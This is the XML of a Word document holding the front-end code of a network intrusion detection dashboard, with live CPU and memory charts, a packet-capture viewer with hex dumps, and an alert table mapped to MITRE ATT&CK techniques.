    <w:p w14:paraId="0AFFBC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padding: 20px 16px 28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE3AC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overflow: visible;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4DFE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718BA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C50D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.metrics-grid,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A476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.architecture-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045DBF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grid-template-columns: 1fr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B94ED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3B55E4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1FB3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.pkt-toolbar input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002B4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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F00E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min-width: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1278D8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1208A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85D4F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&lt;/style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED0FB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&lt;!-- Include Chart.js --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425D03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&lt;script src="https://cdn.jsdelivr.net/npm/chart.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055432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&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1F8C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allAlerts = [];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7750F7C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3F7D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// --- Packet viewer state ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C994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pktPaused = false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E47AF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pktAutoScroll = true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2EA5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pktProto = 'ALL';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7CF7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pktQuery = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14241F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lastSeq = 0;            // highest packet no. already rendered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CE69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pktCache = {};          // no -&gt; packet (for hex detail on click)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C3A1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const MAX_PKT_ROWS = 2000;  // cap DOM rows for smooth scrolling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392473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765A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// Chart Instance Variables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4580E2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let cpuChart, memChart;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C850C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const maxDataPoints = 30; // Show last 30 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173E25F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42E1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initCharts() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC545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const commonOptions = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41091F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responsive: true,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FC6C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maintainAspectRatio: false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD7EB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plugins: { legend: { display: false }, tooltip: { enabled: false } },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696556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scales: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBE72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x: { display: false },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784E79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y: { display: false, min: 0, max: 100 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759DCD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},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DE3B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elements: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AE5D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point: { radius: 0 },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4D6B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line: { tension: 0.4, borderWidth: 2 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0ECA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},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486B04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layout: { padding: 0 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C868B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};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A3DE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9936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const ctxCpu = document.getElementById('cpuChartCanvas').getContext('2d');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BD14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cpuChart = new Chart(ctxCpu, {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C968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type: 'line',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C50C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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4077E1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labels: Array(maxDataPoints).fill(''),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5204F3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datasets: [{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EB27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data: Array(maxDataPoints).fill(0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32549E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borderColor: '#256b86',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734D77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backgroundColor: 'rgba(37, 107, 134, 0.08)',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDD69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fill: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322AA7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}]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29703F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},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524FDA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options: commonOptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8613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});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9A22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1926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const ctxMem = document.getElementById('memChartCanvas').getContext('2d');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F4B3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memChart = new Chart(ctxMem, {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3395CB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type: 'line',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14ACBD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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E41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labels: Array(maxDataPoints).fill(''),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666F73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datasets: [{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBFC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data: Array(maxDataPoints).fill(0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45257A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borderColor: '#675a91',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E91C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backgroundColor: 'rgba(103, 90, 145, 0.08)',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEADA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fill: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DC2F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}]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34275B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},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EB7D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options: commonOptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394CB2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});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7006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AA69FB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4AC1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switchTab(tabId) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDCA3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document.querySelectorAll('.tab-content').forEach(el =&gt; el.classList.remove('active'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E73A4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document.querySelectorAll('.nav-item').forEach(el =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056DAB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el.classList.remove('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B54BD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el.setAttribute('aria-selected', 'false');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF3A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});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FB0B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document.getElementById(tabId).classList.add('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F078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navTarget = document.querySelector(`[onclick="switchTab('${tabId}')"]`);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC2D9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(navTarget) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74160F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navTarget.classList.add('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5D56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navTarget.setAttribute('aria-selected', 'true');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C86A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339E72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A7FC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const pageCopy = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277FE1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'tab-overview': ['Security overview', 'Live host health, sensor status and detection activity'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEFDE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'tab-packets': ['Packet capture', 'Inspect and export packets observed by the sensor'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60343D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'tab-alerts': ['Threat activity', 'Review classified alerts and mapped ATT&amp;CK techniques'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F24A1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'tab-architecture': ['System design', 'Technical overview of the MANTIS detection pipeline']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B644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};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FA0F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const copy = pageCopy[tabId];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512447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(copy) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E533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document.getElementById('headerTitle').textContent = copy[0];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEC6C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document.getElementById('headerSubtitle').textContent = copy[1];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0F33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52745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EA80B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BFED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escapeHtml(s) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610D9C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String(s).replace(/[&amp;&lt;&gt;"']/g, c =&gt; ({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623BA8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'&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BB8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}[c]));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252B64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CB5F2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2F1E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packetRowHtml(p) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BC56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protoClass = 'ws-' + (['TCP', 'UDP', 'ICMP'].includes(p.proto) ? p.proto : 'OTHER');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693D9B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(p.verdict &amp;&amp; p.verdict !== 'clean') protoClass = 'ws-MALICIOUS';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8CA7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verdictBadge = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF963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(p.verdict === 'MALICIOUS')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437094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verdictBadge = ` &lt;span class="verdict-MALICIOUS"&gt;[MALICIOUS]&lt;/span&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51045B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else if (p.verdict === 'BLACKLIST')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2DC5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verdictBadge = ` &lt;span class="verdict-BLACKLIST"&gt;[BLACKLIST]&lt;/span&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FD8C4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FB20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`&lt;tr class="wireshark-row" data-no="${p.no}" onclick="showPacketDetail(${p.no})"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6321CF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&lt;td&gt;${p.no}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232E2A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 style="color:#64748b"&gt;${escapeHtml(p.time)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1471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&lt;td&gt;${escapeHtml(p.src)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545949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&lt;td&gt;${escapeHtml(p.dst)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006647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 class="${protoClass}"&gt;${escapeHtml(p.proto)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC1F3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&lt;td&gt;${p.length}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AE28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&lt;td style="color:#94a3b8"&gt;${escapeHtml(p.info)}${verdictBadge}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3146AB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&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2826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25F02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F46B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// Wireshark-style hex + ASCII dump, built from the raw hex string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D28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renderHexDump(hex) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF6EC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bytes = [];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEA7C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(let i = 0; i &lt; hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B947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out = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F313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(let off = 0; off &lt; bytes.length; off += 16) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4240CE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chunk = bytes.slice(off, off + 16);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B43AC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hexPart = chunk.map(b =&gt; b.toString(16).padStart(2, '0')).join(' ');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4C6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hexPart = hexPart.padEnd(16 * 3 - 1, ' ');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E5F4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ascii = chunk.map(b =&gt; (b &gt;= 32 &amp;&amp; b &lt; 127) ? String.fromCharCode(b) : '.').join('');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EEB9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out += off.toString(16).padStart(4, '0') + '  ' + hexPart + '  ' + escapeHtml(ascii) + '\n';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255C4F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617094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out || '(no payload captured)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F223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256F6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39B5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showPacketDetail(no) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E874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p = pktCache[no];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D9FF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(!p) return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072287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document.querySelectorAll('.wireshark-row').forEach(r =&gt; r.classList.remove('selected'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B160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row = document.querySelector(`.wireshark-row[data-no="${no}"]`);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E2E3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(row) row.classList.add('selected');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1044C01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8AB3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header = `Packet #${p.no}   ${p.time}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C128B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`${p.src}:${p.sport}  -&gt;  ${p.dst}:${p.dport}   ${p.proto}   ${p.length} bytes\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7246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`Info: ${p.info}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F7CD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`Verdict: ${p.verdict}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8621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`${'-'.repeat(58)}\n`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB14E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document.getElementById('pktDetail').textContent = header + renderHexDump(p.hex || '');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261F11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document.getElementById('pktDetailCard').style.display = 'block';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FB91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E0EE6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B5E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resetPackets() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293CE1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lastSeq = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9D2B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pktCache = {};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA570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document.getElementById('wsTableBody').innerHTML = packetEmptyState();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D7A8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document.getElementById('pktDetailCard').style.display = 'none';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206CA2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294483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A449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packetEmptyState() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7299A2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`&lt;tr&gt;&lt;td colspan="7" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0AE2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&lt;strong&gt;Waiting for captured traffic&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9FB1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&lt;span&gt;Packets matching the current filter will appear here.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786378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&lt;/td&gt;&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0AFB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F4E6D9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CF90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setProtoFilter(v) { pktProto = v; resetPackets(); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD9EE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setQueryFilter(v) { pktQuery = v.trim(); resetPackets(); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A07A0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760E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togglePause() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492560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pktPaused = !pktPaused;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0404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btn = document.getElementById('pktPauseBtn');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472955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btn.classList.toggle('paused', pktPaused);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B5B2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btn.innerText = pktPaused ? 'Resume' : 'Pause';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308555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630544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1CD4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toggleAutoScroll(cb) { pktAutoScroll = cb.checked; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FF9E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5F8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async function fetchPackets() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B6D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(pktPaused) return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E1A5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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA07D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url = `/api/packets?after=${lastSeq}&amp;limit=500&amp;proto=${pktProto}`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FDAE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(pktQuery) url += `&amp;q=${encodeURIComponent(pktQuery)}`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2AA3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data = await (await fetch(url)).json();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CDC8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packets = data.packets;   // newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9C24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3BBF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document.getElementById('pktBuffered').innerText = data.buffered;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783B2A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document.getElementById('pktTotal').innerText = data.total;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DBDA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document.getElementById('sidebarPacketCount').innerText = data.buffered;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4D0B4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B62E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(packets.length) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B27CB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let tbody = document.getElementById('wsTableBody');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A969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let scroller = document.getElementById('pktScroll');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E52F7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let atTop = scroller.scrollTop &lt; 40;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEFDFB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669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let emptyRow = tbody.querySelector('.empty-state');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0FD6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if (emptyRow) emptyRow.closest('tr').remove();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A897B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D0B2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packets.forEach(p =&gt; { pktCache[p.no] = p; });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7856F7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lastSeq = Math.max(lastSeq, packets[0].no);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B74A8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64F5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tbody.insertAdjacentHTML('afterbegin', packets.map(packetRowHtml).join(''));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3A8F2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92F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// trim old rows to keep scrolling snappy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E044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while (tbody.children.length &gt; MAX_PKT_ROWS) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B0D4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let removed = tbody.lastChild;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC27E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delete pktCache[removed.getAttribute('data-no')];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72785D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tbody.removeChild(removed);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EACE1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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194EEB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if (pktAutoScroll &amp;&amp; atTop) scroller.scrollTop = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A6CB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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EC4D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 catch (e) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7467ED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document.getElementById('pktBuffered').innerText = '-';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520547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2F8B59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0FF3DD5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7EDB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async function fetchStats() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A72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try {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D767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response = await fetch('/api/stats');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9BED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data = await response.json();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F7D3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allAlerts = data.alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6267FE2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8DD7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Update Overview Metrics Numeric Text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E966E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document.getElementById('cpuVal').innerText = data.cpu_usage;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C110F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document.getElementById('memVal').innerText = data.mem_usage;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25934C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document.getElementById('sensorVal').innerText = data.online_sensors;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED926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document.getElementById('sidebarSensorCount').innerText = data.online_sensors;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB71F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document.getElementById('totalEventsVal').innerText = data.total_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B379D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AA5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Update Graphs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7483A5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(cpuChart &amp;&amp; memChart) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795E90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cpuChart.data.datasets[0].data.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD496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cpuChart.data.datasets[0].data.push(data.cpu_usage);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AFC2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cpuChart.update('none');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C24A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9FC3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memChart.data.datasets[0].data.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162EB7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memChart.data.datasets[0].data.push(data.mem_usage);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192F38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memChart.update('none');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439DBE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159E5DC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810F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Update Engine Hit Counters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3EC0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document.getElementById('ddosCount').innerText = data.ddos_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6B1F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document.getElementById('scanCount').innerText = data.scan_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379CA7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document.getElementById('payloadCount').innerText = data.payload_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC0EA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document.getElementById('blacklistCount').innerText = data.blacklist_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FE53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E3EE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Live traffic telemetry (real, from the sensor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6438B4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document.getElementById('ppsVal').innerText = data.pps;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E78CC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zEl = document.getElementById('zVal');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3CFC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zEl.innerText = data.z_score.toFixed(2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBF63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zEl.style.color = data.ddos_active ? 'var(--accent-red)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125995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: data.ddos_candidate ? 'var(--accent-orange)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D75A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: 'var(--accent-green)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB641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FC97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Packet viewer live counters + protocol breakdown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C52EA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pc = data.proto_counts || {};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E94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document.getElementById('pcTCP').innerText = pc.TCP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28059E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document.getElementById('pcUDP').innerText = pc.UDP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8D03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document.getElementById('pcICMP').innerText = pc.ICMP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBB21F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1351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Render Recent Alerts Table (Overview Page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2117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renderAlerts('alertTableBody', 8);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9D26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D3D1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Render All Alerts Table (Alerts Page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101E16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renderAlerts('fullAlertTableBody', 100);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4D81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7FF5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Status indicator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34ED1F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document.getElementById('statusText').innerText = "System operational";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E429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document.getElementById('statusText').style.color = "var(--accent-green)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572758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document.querySelector('.pulse-dot').style.backgroundColor = "var(--accent-green)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8A90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document.getElementById('lastUpdatedText').innerText =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDC1E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"Updated " + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70861C3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F483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 catch (e) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3661ED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console.error("Connection lost", e);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D37F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document.getElementById('statusText').innerText = "Connection unavailable";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCB7F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document.getElementById('statusText').style.color = "var(--accent-red)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F60F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document.querySelector('.pulse-dot').style.backgroundColor = "var(--accent-red)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C7A6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document.getElementById('lastUpdatedText').innerText = "Retrying telemetry";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A39FE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4DD2C0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92697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9DDF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function renderAlerts(elementId, limit) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9794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let tbody = document.getElementById(elementId);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3138FF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tbody.innerHTML = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A4E1B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74DE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(allAlerts.length === 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309957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tbody.innerHTML = `&lt;tr&gt;&lt;td colspan="6" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C0C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&lt;strong&gt;No threat events in this session&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E672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&lt;span&gt;New detections will appear here automatically.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BB71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&lt;/td&gt;&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3900F5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return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D48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181D17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0A66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allAlerts.slice(0, limit).forEach(alert =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0564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sevClass = alert.severity === 'CRITICAL' ? 'bg-CRITICAL' :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F18D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alert.severity === 'HIGH' ? 'bg-HIGH' :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C70B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alert.message.includes("SCAN") ? 'bg-SCAN' : 'bg-INFO';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0A8A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6F58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// MITRE ATT&amp;CK enrichment, linked to the public technique page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B2E6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tech = '&lt;span style="color:#475569"&gt;-&lt;/span&gt;';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654AE9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(alert.technique_id &amp;&amp; alert.technique_id !== 'N/A') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F760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let url = 'https://attack.mitre.org/techniques/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E407C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+ alert.technique_id.replace('.', '/') + '/';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF090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tech = `&lt;a href="${url}" target="_blank" rel="noopener"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D2EB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class="mono" style="color:var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9267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text-decoration:none"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A934A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title="${alert.technique || ''} - ${alert.tactic || ''}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8E84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&gt;${alert.technique_id}&lt;/a&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198150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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1102A82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DF94C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risk = Number(alert.risk_score || 0);</w:t>
      </w:r>
    </w:p>
